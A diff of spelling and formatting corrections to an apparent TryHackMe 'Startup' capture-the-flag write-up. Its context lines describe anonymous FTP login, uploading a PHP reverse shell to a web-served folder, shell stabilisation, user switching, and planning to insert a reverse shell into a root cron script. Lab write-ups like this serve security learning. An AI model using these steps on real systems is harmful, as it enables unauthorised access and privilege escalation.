@@ -20,7 +20,7 @@ From the scan result we can see there is open port 80 HTTP, 22 SSH and 21 FTP. W
 ftp <IP>
 ```
 
-When it promped for username provide `anonymous`
+When it prompt for username provide `anonymous`
 
 ![ftp](/assets/images/thm/startup/ftp.png)
 
@@ -30,7 +30,7 @@ Let's read the text file.
 
 ![notice](/assets/images/thm/startup/notice.png)
 
-Hmm... probably we'll be able to upload file into FTP which we'll be accessible through the website. I wasn't able to open the jpg file. Let's visit the website.
+Hmm... probably we'll be able to upload file into FTP which it'll be accessible through the website. I wasn't able to open the jpg file. Let's visit the website.
 
 ![website](/assets/images/thm/startup/website.png)
 
@@ -46,7 +46,7 @@ We have found `files` directory. Let's visit it.
 
 ![files](/assets/images/thm/startup/files.png)
 
-These are the files from FTP which we had visited. Let's try to upload reverse shell script. I'm going to use this one `https://github.com/pentestmonkey/php-reverse-shell` Don't forget to change the IP address with your attacking machine IP and desired port. </br>
+These are the files from FTP which we had visited. Let's try to upload reverse shell script. I'm going to use this one `https://github.com/pentestmonkey/php-reverse-shell` Don't forget to change the IP address with your attacking machine IP and desired port.
 
 Go again to the FTP server and navigate to `ftp` folder. From there you can execute the following command `put <FILE_NAME>` to upload your reverse shell script.
 
@@ -66,7 +66,7 @@ Once the listener is set try to reach the script. It will try loading and you sh
 
 ![shell](/assets/images/thm/startup/shell.png)
 
-Now try to find the secret spicy soup recepi. </br>
+Now try to find the secret spicy soup recipe.
 
 If list the root directory `/` you will find an interesting folder `incidents`.
 
@@ -84,7 +84,7 @@ Now on your machine execute the following command to download the pcapng file.
 wget http://<TARGET_MACHINE_IP>:8000/suspicious.pcapng
 ```
 
-Now we are going to use Wireshark to open thw file.
+Now we are going to use Wireshark to open the file.
 
 ![wireshark](/assets/images/thm/startup/wireshark.png)
 
@@ -96,7 +96,7 @@ Someone has tried to see whether user lennie has any sudo rights. I tried to ssh
 
 ![ssh](/assets/images/thm/startup/ssh.png)
 
-Then I decided to try to switch the user from the shell which we have. but first wee need to stabilize our shell.
+Then I decided to try to switch the user from the shell which we have but first we need to stabilize our shell.
 
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -112,7 +112,7 @@ Now we should be able to switch to lennie
 su lennie
 ```
 
-Try to find the user flag. </br>
+Try to find the user flag.
 
 Now we need to find a way to escalate our priviliges. As awlays I tried to check whether lennie has any sudo right with `sudo -l` but lennie doesn't have any rights. What can we do then? There is a folder `scripts` in lennie home directory, let's visit it. There are two files.
 
@@ -144,9 +144,9 @@ wget http://<YOUR_IP>:8000/pspy64
 
 ![pspy-scan](/assets/images/thm/startup/pspy-scan.png)
 
-As we thought planner.sh is run by cronjob as root </br>
+As we thought planner.sh is run by cronjob as root 
 
-So, we are the owner of print.sh. We can add some additional script in it. Here you can find some reverse shell cheat sheet `https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet` </br>
+So, we are the owner of print.sh. We can add some additional script in it. Here you can find some reverse shell cheat sheet `https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet` 
 
 Change the script with your IP address
 
